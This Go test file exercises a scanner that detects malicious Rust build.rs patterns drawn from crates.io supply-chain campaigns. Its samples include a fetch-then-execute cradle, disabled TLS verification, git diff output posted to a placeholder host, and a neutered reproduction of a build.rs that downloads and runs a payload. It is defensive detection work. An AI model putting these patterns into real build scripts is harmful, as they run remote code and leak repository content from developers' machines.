package installsurface

import "testing"

// OPU-39: Rust/Cargo supply-chain detection, motivated by a deep-dive
// research pass across all crates.io malicious-code advisories from March
// through August 2026 (RustSec, Rust Blog, Socket, StepSecurity, Aikido,
// SafeDep, Nextron Systems). Two real campaigns drove the three markers:
//   - arrayref/proc-macro1 (August 20 2026): build.rs downloaded and
//     executed a remote binary; TLS verification was disabled first.
//   - onering (June 10 2026): build.rs ran `git log`/`git diff` and
//     exfiltrated the resulting content to a Sentry ingest endpoint.
// Before this patch, AnalyzeRust's build.rs scan used the fully shared
// scanCaps engine with zero Rust-specific cradle/evasion markers —
// asyncCradleRe and cradleRe are JS/shell/PowerShell syntax only.

// TestCargoFetchExecCradleDetected covers the arrayref/proc-macro1 shape:
// a Rust HTTP client fetch followed by Command::new/process::Command.
func TestCargoFetchExecCradleDetected(t *testing.T) {
	positives := []string{
		`let bytes = reqwest::blocking::get(url).unwrap().bytes().unwrap();
		 std::fs::write(&dest, &bytes).unwrap();
		 Command::new(&dest).status().unwrap();`,
		`let resp = ureq::get(&url).call().unwrap();
		 std::fs::write(&path, resp.into_string().unwrap()).unwrap();
		 process::Command::new(&path).spawn().unwrap();`,
		`let body = client.get(&url).send().unwrap().bytes().unwrap();
		 write_payload(&body);
		 Command::new(payload_path).output().unwrap();`,
	}
	for _, text := range positives {
		if !scanHasCap(text, CapCradle) {
			t.Errorf("expected CapCradle for cargo fetch-then-exec shape: %q", text)
		}
	}

	// A legitimate crate that fetches a prebuilt binary in one function and
	// runs an UNRELATED tool in a separately-declared function must not
	// match — the same esbuild-negative reasoning OPU-34 established for JS.
	negative := `
		fn download_prebuilt(url: &str, dest: &str) {
			let bytes = reqwest::blocking::get(url).unwrap().bytes().unwrap();
			std::fs::write(dest, &bytes).unwrap();
		}
		fn run_protoc_codegen() {
			Command::new("protoc").arg("--rust_out=.").status().unwrap();
		}
	`
	if scanHasCap(negative, CapCradle) {
		t.Error("did not expect CapCradle when fetch and exec are in separately-declared functions")
	}

	// Same shape, but the unrelated function's exec target is an identifier
	// rather than a string literal — the "negative" above is silent for a
	// reason unrelated to the function-declaration filter (a literal
	// argument already fails the identifier check on its own), so it never
	// actually exercises rustFnDeclRe. This case isolates it: nothing but
	// the function boundary keeps this from matching.
	negativeIdentTarget := `
		fn download_prebuilt(url: &str, dest: &str) {
			let bytes = reqwest::blocking::get(url).unwrap().bytes().unwrap();
			std::fs::write(dest, &bytes).unwrap();
		}
		fn run_something(tool_path: &str) {
			Command::new(tool_path).status().unwrap();
		}
	`
	if scanHasCap(negativeIdentTarget, CapCradle) {
		t.Error("did not expect CapCradle when fetch and identifier-exec are in separately-declared functions")
	}
}

// TestTLSBypassDetected covers the TLS-verification-disable marker.
func TestTLSBypassDetected(t *testing.T) {
	positives := []string{
		`let client = reqwest::Client::builder().danger_accept_invalid_certs(true).build().unwrap();`,
		`.danger_accept_invalid_hostnames(true)`,
		`connector.set_verify(SslVerifyMode::NONE);`,
	}
	for _, text := range positives {
		if !scanHasCap(text, CapObfuscation) {
			t.Errorf("expected CapObfuscation for TLS bypass: %q", text)
		}
	}
	// A legitimate cert-pinning or custom-CA setup that does NOT disable
	// verification must not match.
	negative := `let client = reqwest::Client::builder().add_root_certificate(cert).build().unwrap();`
	if scanHasCap(negative, CapObfuscation) {
		t.Error("did not expect CapObfuscation for a legitimate custom-CA setup")
	}
}

// TestGitContentExfilDetected covers the onering shape: git log/diff/show
// combined with network egress.
func TestGitContentExfilDetected(t *testing.T) {
	positive := `
		let diff = Command::new("git").args(["diff", "HEAD~1"]).output().unwrap();
		let body = String::from_utf8(diff.stdout).unwrap();
		reqwest::blocking::Client::new().post("https://example.invalid/ingest").body(body).send().unwrap();
	`
	if !scanHasCap(positive, CapCradle) {
		t.Error("expected CapCradle for git-diff-then-network shape")
	}

	// The extremely common, entirely benign version-stamping idiom must
	// NOT match — git rev-parse/describe reveal only the commit identity,
	// not content, and this pattern is ubiquitous in real build.rs files
	// (also often paired with network-touching crates elsewhere in the
	// same build.rs for unrelated reasons, e.g. downloading a prebuilt
	// binary — so gating on git subcommand precision matters, not just on
	// CapNetwork co-occurrence).
	versionStamping := `
		let hash = Command::new("git").args(["rev-parse", "HEAD"]).output().unwrap();
		println!("cargo:rustc-env=GIT_HASH={}", String::from_utf8_lossy(&hash.stdout));
		let bytes = reqwest::blocking::get("https://example.invalid/unrelated-asset").unwrap();
	`
	if scanHasCap(versionStamping, CapCradle) {
		t.Error("did not expect CapCradle for git rev-parse version-stamping, even with unrelated network activity present")
	}

	// git log/diff with NO network present must not match either — reading
	// git content locally with no exfiltration path is not the pattern.
	noNetwork := `let diff = Command::new("git").args(["diff", "HEAD~1"]).output().unwrap();`
	if scanHasCap(noNetwork, CapCradle) {
		t.Error("did not expect CapCradle for git diff with no network egress present")
	}
}

// TestAnalyzeRustFullSampleReproduction is an end-to-end regression using a
// faithful, IOC-neutered reproduction of the arrayref/proc-macro1 build.rs
// shape (C2 replaced with an inert RFC 5737 placeholder).
func TestAnalyzeRustFullSampleReproduction(t *testing.T) {
	buildRs := `
use std::process::Command;
use std::fs;

fn main() {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let url = "https://203.0.113.44/payload"; // inert placeholder, real sample used obfuscated C2
    let bytes = client.get(url).send().unwrap().bytes().unwrap();
    let dest = std::env::temp_dir().join("payload");
    fs::write(&dest, &bytes).unwrap();
    Command::new(&dest).status().unwrap();
}
`
	s := AnalyzeRust(buildRs)
	if len(s.Hooks) == 0 {
		t.Fatal("expected at least one hook from AnalyzeRust")
	}
	h := s.Hooks[0]
	want := map[Capability]bool{CapCradle: false, CapObfuscation: false, CapExec: false, CapNetwork: false}
	for _, c := range h.Caps {
		if _, ok := want[c]; ok {
			want[c] = true
		}
	}
	for cap, got := range want {
		if !got {
			t.Errorf("expected %s on the arrayref/proc-macro1 reproduction, was not set", cap)
		}
	}
}
